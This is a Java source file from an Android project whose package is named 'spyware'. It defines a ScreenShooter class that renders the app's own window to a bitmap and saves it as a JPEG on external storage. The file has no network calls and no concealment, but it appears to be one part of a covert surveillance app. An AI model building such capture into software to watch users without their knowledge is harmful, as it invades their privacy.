package com.example.cristianturetta.spyware;

import android.app.Activity;
import android.content.Context;
import android.graphics.Bitmap;
import android.os.Environment;
import android.util.Log;
import android.view.View;
import java.io.File;
import java.io.FileOutputStream;
import java.util.Date;

public class ScreenShooter {

    private Context context;
    private Activity activity;

    public ScreenShooter(Context context) {
        this.context = context;
    }

    public ScreenShooter(Activity activity) {
        this.activity = activity;
    }

    // TODO error parsing context to activity
    private Activity getActivity(){
        Activity a;
        try {
            a = (Activity)context;
            return a;
        }catch (Exception e){
            Log.e("Error", "casting context to activity");
        }
        return null;
    }

    public void shoot(){
        if (isExternalStorageWritable()) {
            View view = activity.getWindow().getDecorView();
            view.measure(View.MeasureSpec.makeMeasureSpec(0, View.MeasureSpec.UNSPECIFIED),
                    View.MeasureSpec.makeMeasureSpec(0, View.MeasureSpec.UNSPECIFIED));
            view.layout(0, 0, view.getMeasuredWidth(), view.getMeasuredHeight());
            view.setDrawingCacheEnabled(true);

            final Bitmap bitmap = Bitmap.createBitmap(view.getDrawingCache());
            view.setDrawingCacheEnabled(false);

            Date date = new Date();
            android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", date);

            try {
                String screenShotPath = Environment.getExternalStorageDirectory().toString() + "/" + date + ".jpg";

                File imageFile = new File(screenShotPath);
                FileOutputStream outputStream = new FileOutputStream(imageFile);

                bitmap.compress(Bitmap.CompressFormat.JPEG, 90, outputStream);

                outputStream.flush();
                outputStream.close();
                Log.d("Shoot:", "screenshot taken");
            } catch (Exception e) {
                Log.e("Shoot:", e.getLocalizedMessage());
            }
        }else {
            Log.d("Shoot:", "external storage is not writable");
        }
    }

    /**
     * Checks if external storage is available for read and write
     * */
    public boolean isExternalStorageWritable() {
        String state = Environment.getExternalStorageState();
        if (Environment.MEDIA_MOUNTED.equals(state)) {
            return true;
        }
        return false;
    }

    public File getPublicAlbumStorageDir(String albumName) {
        // Get the directory for the user's public pictures directory.
        File file = new File(Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_PICTURES), albumName);
        if (!file.mkdirs()) {
            Log.e("Error Directory:", "Directory not created");
        }
        return file;
    }
}
